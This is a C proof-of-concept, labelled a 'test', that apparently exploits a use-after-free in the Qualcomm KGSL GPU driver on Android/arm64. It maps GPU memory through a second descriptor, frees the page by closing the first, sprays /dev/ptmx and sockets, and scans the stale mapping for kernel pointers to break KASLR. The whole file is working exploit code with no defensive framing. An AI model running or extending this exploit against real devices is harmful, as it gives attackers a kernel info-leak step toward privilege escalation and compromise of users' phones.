#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <stdint.h>
#include <sys/socket.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

struct gpumem_alloc_req {
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

#define SPRAY_FDS 5000
int ptmx_fds[SPRAY_FDS];
int sock_fds[SPRAY_FDS];

int main() {
    printf("[*] Starting GPU Physical Page UAF / KASLR Leak test v2...\n");

    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd1 < 0) {
        perror("[-] Failed to open fd1");
        return 1;
    }

    struct gpumem_alloc_req req = {0};
    req.size = 0x1000;

    if (ioctl(fd1, IOCTL_GPUMEM_ALLOC, &req) < 0) {
        perror("[-] fd1 alloc failed");
        return 1;
    }
    printf("[+] Allocated GPU memory at offset: 0x%lx\n", req.gpuaddr);

    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    uint64_t *ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd2, req.gpuaddr);
    if (ptr2 == MAP_FAILED) {
        perror("[-] fd2 mmap failed");
        return 1;
    }
    printf("[+] fd2 mmap successful! Buffer at %p\n", ptr2);

    ptr2[0] = 0x1122334455667788ULL;

    printf("[*] Closing fd1 to trigger page release...\n");
    close(fd1);
    
    // Tiny sleep to let kgsl workqueue free the object
    usleep(50000); 

    printf("[*] Spraying PTMX to force slab allocations on new pages...\n");
    for (int i = 0; i < SPRAY_FDS; i++) {
        ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        // also socket
        sock_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
    }

    printf("[*] Scanning UAF page for Kernel Pointers...\n");
    int found_leak = 0;
    
    // We scan 512 uint64_t entries (4096 bytes)
    for (int i = 0; i < 512; i++) {
        uint64_t val = ptr2[i];
        if (val != 0 && val != 0x1122334455667788ULL) {
            // Kernel pointers on arm64 typically start with 0xffffff80 or 0xffffffc0
            if ((val & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                printf("    [KASLR LEAK] Address at offset 0x%03x: 0x%016lx\n", i * 8, val);
                found_leak = 1;
            } else {
                // Ignore small values, or print a few
                if (i < 8) printf("    [DATA] Offset 0x%03x: 0x%016lx\n", i * 8, val);
            }
        }
    }

    if (!found_leak) {
        printf("[-] No kernel pointers found.\n");
    }

    // cleanup
    for (int i = 0; i < SPRAY_FDS; i++) {
        if (ptmx_fds[i] >= 0) close(ptmx_fds[i]);
        if (sock_fds[i] >= 0) close(sock_fds[i]);
    }
    return 0;
}
